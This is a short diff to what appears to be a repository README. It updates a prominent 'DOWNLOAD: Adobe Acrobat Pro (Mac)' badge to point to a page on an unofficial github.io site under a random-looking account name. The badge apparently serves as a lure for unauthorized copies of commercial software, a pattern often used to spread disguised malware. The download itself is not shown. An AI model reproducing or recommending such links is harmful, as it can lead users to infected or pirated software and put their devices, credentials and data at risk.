@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![📕 DOWNLOAD: Adobe Acrobat Pro (Mac)](https://img.shields.io/badge/📕%20DOWNLOAD:%20Adobe%20Acrobat%20Pro%20(Mac)-crimson?style=for-the-badge&logo=adobeacrobatreader&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/)
+[![📕 DOWNLOAD: Adobe Acrobat Pro (Mac)](https://img.shields.io/badge/📕%20DOWNLOAD:%20Adobe%20Acrobat%20Pro%20(Mac)-crimson?style=for-the-badge&logo=adobeacrobatreader&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/adobeacrobat)
 
 
 </div>
